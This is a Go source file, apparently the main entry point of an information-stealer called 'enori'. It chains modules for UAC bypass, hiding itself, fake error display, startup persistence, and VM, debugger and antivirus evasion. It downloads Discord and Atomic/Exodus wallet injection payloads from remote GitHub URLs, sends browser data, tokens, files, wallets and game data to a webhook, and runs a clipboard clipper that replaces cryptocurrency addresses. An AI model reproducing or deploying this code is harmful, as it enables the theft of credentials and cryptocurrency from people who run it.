package main

import (
	"github.com/mmmhlecaca/enori/modules/antidebug"
	"github.com/mmmhlecaca/enori/modules/antivm"
	"github.com/mmmhlecaca/enori/modules/antivirus"
	"github.com/mmmhlecaca/enori/modules/browsers"
	"github.com/mmmhlecaca/enori/modules/clipper"
	"github.com/mmmhlecaca/enori/modules/commonfiles"
	"github.com/mmmhlecaca/enori/modules/discodes"
	"github.com/mmmhlecaca/enori/modules/discordinjection"
	"github.com/mmmhlecaca/enori/modules/fakeerror"
	"github.com/mmmhlecaca/enori/modules/games"
	"github.com/mmmhlecaca/enori/modules/hideconsole"
	"github.com/mmmhlecaca/enori/modules/startup"
	"github.com/mmmhlecaca/enori/modules/system"
	"github.com/mmmhlecaca/enori/modules/tokens"
	"github.com/mmmhlecaca/enori/modules/uacbypass"
	"github.com/mmmhlecaca/enori/modules/vpn"
	"github.com/mmmhlecaca/enori/modules/wallets"
	"github.com/mmmhlecaca/enori/modules/walletsinjection"
	"github.com/mmmhlecaca/enori/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "",
		"cryptos": map[string]string{
			"BTC": "",
			"BCH": "",
			"ETH": "",
			"XMR": "",
			"LTC": "",
			"XCH": "",
			"XLM": "",
			"TRX": "",
			"ADA": "",
			"DASH": "",
			"DOGE": "",
		},
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	antivm.Run()
	go antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run(
		"https://raw.githubusercontent.com/mmmhlecaca/enori-utils/refs/heads/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
